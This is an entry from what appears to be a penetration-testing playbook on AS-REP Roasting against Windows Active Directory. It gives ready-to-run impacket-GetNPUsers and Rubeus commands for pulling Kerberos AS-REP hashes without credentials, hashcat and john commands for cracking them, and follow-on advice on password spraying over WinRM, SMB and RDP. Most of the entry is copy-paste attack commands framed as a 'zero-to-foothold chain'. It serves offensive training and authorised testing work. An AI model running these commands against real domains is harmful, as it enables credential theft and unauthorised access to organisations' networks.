---
id: asreproast
title: AS-REP Roasting
stage: initial-access
tags: [windows, ad]
summary: Request AS-REP hashes for accounts that don't require Kerberos pre-authentication — no credentials needed, just a username list.
leads_to:
  - winrm
  - rev-shell
  - rdp-access
  - bloodhound
  - password-cracking
---

## Prerequisites

A username list (from LDAP, kerbrute, or RPC). No credentials required for the unauthenticated variant — this is often the very first AD attack after user enumeration.

AS-REP roasting exploits accounts where `DONT_REQ_PREAUTH` is set in `userAccountControl`. Without pre-auth, the KDC returns an AS-REP blob encrypted with the user's password hash, and you crack it offline. This is one of the few AD attacks that requires zero credentials — pair it immediately with Kerberos user enumeration for a clean zero-to-foothold chain.

## Quick Win

> No creds needed — just a username list and the DC IP.

```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass \
  -usersfile users.txt -format hashcat -outputfile asrep.txt
```

## Authenticated (More Reliable)

> With any valid credential, queries LDAP for ALL accounts with the flag — no guessing needed.

```bash
impacket-GetNPUsers $DOMAIN/user:password -dc-ip $DC_IP \
  -request -format hashcat -outputfile asrep.txt
```

## From Windows

> Rubeus enumerates and requests in one shot from inside the domain.

```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

## Crack

> Mode 18200 — `$krb5asrep$23$` format.

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

## Leads To

Cracked password → authenticate as that user → password-spray across WinRM/SMB/RDP, then run BloodHound immediately with the new credential. AS-REP roastable accounts are often service accounts — check what they have access to in BloodHound before touching anything else.
